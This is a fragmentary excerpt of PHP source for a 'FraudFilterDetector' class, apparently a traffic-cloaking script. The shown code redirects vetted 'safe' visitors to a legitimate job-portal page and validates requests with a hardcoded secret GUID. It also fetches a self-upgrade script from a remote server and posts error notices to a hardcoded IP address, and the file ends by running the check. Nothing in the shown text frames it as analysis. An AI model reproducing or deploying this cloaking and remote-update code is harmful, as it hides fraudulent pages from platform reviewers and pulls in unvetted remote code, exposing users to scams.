...
class FraudFilterDetector_9l2ko {
    ...
    function isSignatureValid($sign, $time) {
        $str = '11521e3c-5aa9-45c3-9593-f88c94b1cb4a.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.medienboard.de/en/media-jobs/jobportal/book-trade-publishers-printing-industry');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 11521e3c-5aa9-45c3-9593-f88c94b1cb4a',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 11521e3c-5aa9-45c3-9593-f88c94b1cb4a';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 11521e3c-5aa9-45c3-9593-f88c94b1cb4a';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=9l2ko&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_9l2ko = new FraudFilterDetector_9l2ko();
$fraudFilterDetector_9l2ko->check();
